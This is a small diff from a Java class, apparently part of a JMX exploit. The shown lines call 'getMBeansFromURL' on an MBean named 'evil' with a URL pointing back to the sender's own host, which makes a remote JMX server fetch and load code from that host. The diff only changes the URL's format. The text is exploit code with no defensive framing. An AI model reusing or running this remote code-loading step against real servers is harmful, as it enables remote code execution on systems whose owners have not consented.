@@ -70,7 +70,7 @@ public class RemoteMbean {
 
                 System.out.println("Sending IP:"+localIP);
                 Object res = m.invoke(evil.getObjectName(), "getMBeansFromURL",
-                                      new Object[] { String.format("http://%s:80/woohoo.html", localIP) },
+                                      new Object[] { String.format("%s/woot.html", localIP) },
                                       new String[] { String.class.getName() }
                                       );
                 HashSet res_set = ((HashSet)res);
